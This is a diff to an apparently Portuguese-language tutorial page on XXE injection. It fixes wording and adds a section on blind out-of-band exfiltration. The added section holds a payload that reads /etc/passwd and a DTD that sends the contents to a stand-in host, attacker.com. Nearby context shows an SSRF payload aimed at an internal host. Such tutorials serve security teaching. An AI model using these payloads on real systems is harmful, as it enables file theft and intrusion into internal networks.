@@ -3,7 +3,7 @@
 <h1>O que seria o XML External Entity Injection? (XXE)</h1>
 
 É uma falha de segurança WEB que permite o atacante interferir em uma aplicação que processe dados de XML. Isso permite que um atacante visualize arquivos
-no filesystem do servidor da aplicação. Em alguns casos o atacante pode escalar um ataque XXE para comprometer os servidores adjacentes ou outra estrutura
+no sistema de arquivos do servidor da aplicação. Em alguns casos o atacante pode escalar um ataque XXE para comprometer os servidores adjacentes ou outra estrutura
 de backend, aproveitando a vulnerabilidade para tentar ataques de falsificação de solicitação do lado do servidor SSRF (Server-side Request Forgery).
 
 <h2>Como surgem as vulnerabilidades de XXE?</h2>
@@ -48,11 +48,35 @@ Esse payload define um entidade externa como &xxe; que contem o valor de /etc/pa
 
 Além da recuperação de dados sensíveis, o outro impacto principal dos ataques XXE é que eles podem ser usados para executar a falsificação de solicitação do servidor (SSRF). Essa é uma vulnerabilidade potencialmente séria, na qual a aplicação do lado do servidor pode ser induzido para fazer solicitações HTTP a qualquer URL que o servidor possa acessar, isso inclui serviços internos no quais não estão expostos diretamente a internet.
 
-Para explorar uma vulnerabilidade XXE para executar um ataque SSRF, você precisa definir uma entidade XML externa usando a URL que deseja segmentar e usar a entidade definida dentro de um valor de dados. Se você puder usar a entidade definida em um valor de dados que for retornado na resposta do aplicativo, poderá visualizar a resposta da URL na resposta da aplicação e, portanto, obterá interação bidirecional com o sistema de backend. Caso contrário, você só poderá realizar ataques cegos de SSRF (que ainda podem ter consequências críticas).
+Para explorar uma vulnerabilidade XXE para executar um ataque SSRF, você precisa definir uma entidade XML externa usando a URL que deseja segmentar e usar a entidade definida dentro de um valor de dados. Se você puder usar a entidade definida em um valor de dados que for retornado na resposta da aplicação, poderá visualizar a resposta da URL na resposta da aplicação e, portanto, obterá interação bidirecional com o sistema de backend. Caso contrário, você só poderá realizar ataques Blind de SSRF (que ainda podem ter consequências críticas).
 
 No exemplo XXE a seguir, a entidade externa fará com que o servidor faça uma solicitação HTTP de backend a um sistema interno dentro da infraestrutura da organização:
 
       <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+ 
+<h4>Explorando blind XXE exfiltrando dados out-of-band (OOB)</h4>
+ 
+O processo para explorar a vulnerabilidade XXE Out-of-band (fora da banda) é semelhante ao uso de entidades de parâmetros com XXE in-band e envolve a criação de um DTD externo (definição de tipo de documento). Há uma grande diferença com esse tipo de ataque, o invasor precisa do analisador XML para fazer uma solicitação adicional a um servidor controlado pelo atacante. Isso é necessário para ler o conteúdo do arquivo local.
+
+exemplo:
+
+  <p>Request do lado do server alvo</p>
+
+    POST http://example.com/xml HTTP/1.1
+    <?xml version="1.0" encoding="ISO-8859-1"?>
+      <!DOCTYPE data [
+      <!ENTITY % file SYSTEM
+      "file:///etc/passwd">
+      <!ENTITY % dtd SYSTEM
+      "http://attacker.com/evil.dtd">
+      %dtd;
+     ]>
+    <data>&send;</data>
+  
+  <p>Lado do servidor do atacante. coleta a resposta recebida do server DTD (attacker.com/evil.dtd)</p>
+
+    <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?collect=%file;'>">
+    %all;
  
 <h4>3) Blind XXE vulnerabilities</h4>
 
